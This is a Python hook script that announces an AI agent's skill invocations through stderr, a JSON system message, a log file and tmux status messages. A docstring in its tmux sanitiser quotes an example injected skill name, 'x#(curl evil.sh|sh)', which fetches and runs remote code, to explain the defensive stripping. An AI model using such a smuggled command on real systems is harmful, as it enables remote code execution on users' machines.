#!/usr/bin/env python3
"""PreToolUse hook for the `Skill` tool — announce skill invocation in the
CTO / teammate pane with a yellow star and the skill name.

Output is delivered three ways for max compatibility:
  1. stderr ANSI-colored line — visible directly in the terminal pane
  2. hookSpecificOutput.systemMessage JSON — Claude Code's UI message
     channel, surfaces in the agent transcript
  3. Append to ~/.harness-claude/skill-activity.log — tailed by the
     observe tmux layout's skill-activity pane so the user sees the
     star even when the hook fires inside an in-process teammate
     whose stderr is not surfaced.

Exit 0 always. Never block tool invocation.
"""
import json
import os
import sys
import time


def _extract_skill_name(tool_input):
    """Try several common keys for the skill identifier."""
    if not isinstance(tool_input, dict):
        return None
    for key in ("skill", "name", "skill_name", "skillName"):
        v = tool_input.get(key)
        if v:
            return str(v)
    # Some tool inputs nest under 'arguments'
    args = tool_input.get("arguments")
    if isinstance(args, dict):
        for key in ("skill", "name", "skill_name", "skillName"):
            v = args.get(key)
            if v:
                return str(v)
    return None


def _extract_agent(payload):
    """어느 에이전트가 이 스킬을 쓰는지 best-effort 로 알아낸다.
    표기 규칙 (plans/harness.md): `<에이전트> ★ <스킬>`.
    소스 우선순위: hook payload 의 에이전트 키 → 환경변수 →
    transcript 경로 힌트 → 'cto' (lead 폴백). fail-open."""
    if isinstance(payload, dict):
        for key in ("agent_type", "agent_name", "agentName", "teammate_name",
                    "teammateName", "subagent_type", "agent"):
            v = payload.get(key)
            if v:
                return str(v)
    for env_key in ("CLAUDE_AGENT_NAME", "CLAUDE_TEAMMATE_NAME",
                    "TEAMMATE_NAME", "AGENT_NAME"):
        v = os.environ.get(env_key)
        if v:
            return v
    # transcript 경로에 subagents/<name>... 형태가 있으면 추출
    if isinstance(payload, dict):
        tp = str(payload.get("transcript_path", ""))
        if "/subagents/" in tp:
            tail = tp.split("/subagents/", 1)[1]
            name = tail.split("/", 1)[0].split(".", 1)[0]
            # agent-<id>.jsonl 같은 비식별 이름은 버림
            if name and not name.startswith(("agent-", "wf_")):
                return name
    return "cto"


def _tmux_safe(s, maxlen=40):
    """Sanitize a skill identifier before interpolating into a tmux format
    string. tmux interprets `#(cmd)` as shell exec and `#{var}` as variable
    expansion on every status refresh — an attacker-controlled skill name
    like `x#(curl evil.sh|sh)` would persist in status-right and re-run.
    Strip every tmux/shell metachar plus control chars; cap length."""
    out = []
    for ch in s:
        if ch in "#$`(){}":
            out.append("?")
        elif ord(ch) < 32:
            continue
        else:
            out.append(ch)
    return ("".join(out)[:maxlen]) or "?"


def main():
    raw = sys.stdin.read()
    if not raw.strip():
        sys.exit(0)

    try:
        p = json.loads(raw)
    except Exception:
        sys.exit(0)

    # Only act on Skill tool invocations.
    if p.get("tool_name") != "Skill":
        sys.exit(0)

    skill = _extract_skill_name(p.get("tool_input")) or "<unknown>"
    agent = _extract_agent(p)

    # 1) terminal-visible line — `<에이전트> ★ <스킬>` (plans/harness.md 표기)
    YELLOW = "\033[33m"
    BOLD = "\033[1m"
    CYAN = "\033[36m"
    RESET = "\033[0m"
    print(f"{CYAN}{agent}{RESET} {YELLOW}★{RESET} {BOLD}{skill}{RESET} 스킬을 사용합니다.", file=sys.stderr)

    # 2) UI systemMessage for transcript surface
    out = {
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "systemMessage": f"{agent} ★ {skill} 스킬을 사용합니다.",
        }
    }
    print(json.dumps(out))

    # 3) Append to shared activity log (CTO 세션 하단 tail pane 이 표시).
    try:
        log_dir = os.path.expanduser("~/.harness-claude")
        os.makedirs(log_dir, exist_ok=True)
        log_path = os.path.join(log_dir, "skill-activity.log")
        ts = time.strftime("%H:%M:%S")
        role = os.environ.get("HARNESS_ROLE", "?")
        with open(log_path, "a", encoding="utf-8") as fp:
            fp.write(f"{ts} [{role}] \033[36m{agent}\033[0m \033[33m★\033[0m \033[1m{skill}\033[0m\n")
    except Exception:
        pass  # fail-open per hook contract

    # 4) tmux display + persistent status-right on the CTO pane.
    # systemMessage / stderr from in-process subagent hooks don't reach
    # the lead's terminal in Agent Teams mode; tmux surfaces a flash + a
    # persistent right-status badge so the user always sees the last ★
    # without scrollback hunting. Target the session derived from
    # HARNESS_ROLE so subagent invocations still hit the lead's pane.
    role = os.environ.get("HARNESS_ROLE", "")
    if not role.startswith("cto:"):
        # CEO-less mode: no tmux target, skip flash + status-right
        sys.exit(0)
    try:
        import subprocess
        safe_skill = _tmux_safe(skill)
        safe_agent = _tmux_safe(agent, maxlen=20)
        flash = f"#[fg=cyan]{safe_agent}#[default] #[fg=yellow,bold]★ {safe_skill}#[default] 스킬 사용"
        status = f"#[fg=cyan]{safe_agent}#[default] #[fg=yellow,bold]★ {safe_skill}#[default] {time.strftime('%H:%M:%S')}"
        target = None
        if role.startswith("cto:"):
            target = "cto-" + role[len("cto:"):]
        # 4a) Flash (~6s, easier to catch)
        flash_cmd = ["tmux", "display-message", "-d", "6000"]
        if target:
            flash_cmd += ["-t", target]
        flash_cmd += [flash]
        subprocess.run(flash_cmd, check=False, timeout=2)
        # 4b) Persistent right-status badge on the CTO session — stays
        # until the next skill fires.
        if target:
            subprocess.run(
                ["tmux", "set-option", "-t", target,
                 "status-right", status],
                check=False, timeout=2,
            )
            subprocess.run(
                ["tmux", "set-option", "-t", target,
                 "status-right-length", "60"],
                check=False, timeout=2,
            )
            subprocess.run(
                ["tmux", "set-option", "-t", target, "status", "on"],
                check=False, timeout=2,
            )
    except Exception:
        pass  # fail-open

    sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except Exception:
        sys.exit(0)  # fail open
